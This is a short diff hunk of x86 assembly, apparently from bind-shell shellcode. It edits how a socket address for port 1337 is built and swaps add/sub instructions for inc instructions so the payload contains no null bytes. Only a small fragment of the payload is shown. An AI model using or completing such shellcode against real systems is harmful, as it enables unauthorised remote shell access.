@@ -34,9 +34,7 @@ bindsckcode:
 
 ;replace 3905 below wih desired port number. remember byte order!
    push    0x39050103   ;sin_family sin_port(1337) (fff2 changed to 0002)
-;    add     word [esp], 0x2
-;   sub     word [esp+2], 0x101  ;This was added to change fff2 to 0002 to avoid nulls
-   inc     esp
+   inc     esp          ;The next 6 lines are to change 0103 to 0002 w/o using nulls
    inc     esp
    inc     eax
    inc     eax 
